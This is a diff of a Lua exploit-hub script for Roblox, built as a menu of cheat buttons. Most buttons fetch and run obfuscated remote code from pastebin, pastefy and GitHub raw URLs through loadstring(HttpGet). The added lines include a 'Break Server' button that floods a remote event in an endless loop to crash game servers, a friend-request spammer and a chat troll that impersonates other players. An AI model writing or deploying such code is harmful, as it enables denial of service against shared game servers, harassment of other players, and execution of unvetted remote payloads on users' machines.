@@ -204,23 +204,40 @@ Tab:AddButton({
       end    
 })
 Tab:AddButton({
-	Name = "Fling 2",
-	Callback = function()
-      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
-  	end    
+    Name = "Fling 2",
+    Callback = function()
+              loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
+      end    
 })
 Tab:AddButton({
-	Name = "Fling 3",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastebin.com/raw/saMtiek2",true))()
-  	end    
+    Name = "Fling 3",
+    Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/saMtiek2",true))()
+      end    
 })
 Tab:AddButton({
-	Name = "Fling 4",
-	Callback = function()
-      		loadstring(game:HttpGet(('https://pastefy.app/w7KnPY70/raw'),true))()
-  	end    
+    Name = "Fling 4",
+    Callback = function()
+              loadstring(game:HttpGet(('https://pastefy.app/w7KnPY70/raw'),true))()
+      end    
 })
+Tab:AddButton({
+    Name = "Break Server stop work",
+    Callback = function()
+              while true do
+    game.Workspace.BasicCommand:FireServer(7, "", 5.5, 1.5, true, "Pizza")
+wait()
+end
+      end    
+})
+
+Tab:AddButton({
+    Name = "Faceless",
+    Callback = function()
+              print("button pressed")
+      end    
+})
+
 local Tab = Window:MakeTab({
     Name = "Pizza Place",
     Icon = "rbxassetid://4483345998",
@@ -241,34 +258,46 @@ Tab:AddButton({
       end    
 })
 local Tab = Window:MakeTab({
-	Name = "client/visual",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
+    Name = "client/visual",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
 })
 Tab:AddButton({
-	Name = "RoXploit",
-	Callback = function()
-      		loadstring(game:GetObjects('rbxassetid://364364477')[1].Source)()
-  	end    
+    Name = "RoXploit",
+    Callback = function()
+              loadstring(game:GetObjects('rbxassetid://364364477')[1].Source)()
+      end    
 })
 Tab:AddButton({
-	Name = "c00lgui",
-	Callback = function()
-      		loadstring(game:GetObjects("rbxassetid://11801763945")[1].Source)()
-  	end    
+    Name = "c00lgui",
+    Callback = function()
+              loadstring(game:GetObjects("rbxassetid://11801763945")[1].Source)()
+      end    
 })
 local Tab = Window:MakeTab({
-	Name = "Universal",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-Tab:AddButton({
-	Name = "Invisible (tool)",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastebin.com/raw/uUtRsAX5"))()
-  	end    
+    Name = "Universal",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
 })
 
+Tab:AddButton({
+    Name = "Invisible (tool)",
+    Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/uUtRsAX5"))()
+      end    
+})
+
+Tab:AddButton({
+    Name = "Filtering disabled Check Type /console ",
+    Callback = function()
+              if game.Workspace.FilteringEnabled == false then
+print("Filtering is disabled!")
+end
+if game.Workspace.FilteringEnabled == true then
+print("Filtering is enabled!")
+end
+      end    
+})
 
 local Tab = Window:MakeTab({
     Name = "Info",
@@ -302,6 +331,51 @@ local Section = Tab:AddSection({
 
 local Section = Tab:AddSection({
     Name = "Instagram: 🤨?"
+})
+
+local Tab = Window:MakeTab({
+    Name = "shhhh its Fe",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name = "Friend Request Spam",
+    Callback = function()
+              game:GetObjects("rbxassetid://558658046")[1].Parent=game.Players.LocalPlayer.PlayerGui
+      end    
+})
+
+Tab:AddButton({
+	Name = "Creeper R6",
+	Callback = function()
+      		local lol = game:GetService('Players').LocalPlayer
+lol.Character["Head"].Mesh:Destroy()
+lol.Character["Left Arm"]:Destroy()
+lol.Character["Right Arm"]:Destroy()
+
+for i,v in pairs(game:GetService('Players').LocalPlayer.Character:GetDescendants()) do
+if v:IsA'Hat' or v:IsA'Accessory' then
+v.Parent = game:GetService'Workspace'
+end
+end
+
+local fuck = game:GetService('Players').LocalPlayer
+if game.Players.LocalPlayer == fuck then
+print("succesfully creeped u! enjoy!")
+end
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Chat troll",
+	Callback = function()
+      		local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(Message)
+  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("".."["..Action[i].Name.."]".." "..Message, "All")
+  end)
+end
+  	end    
 })
 
 
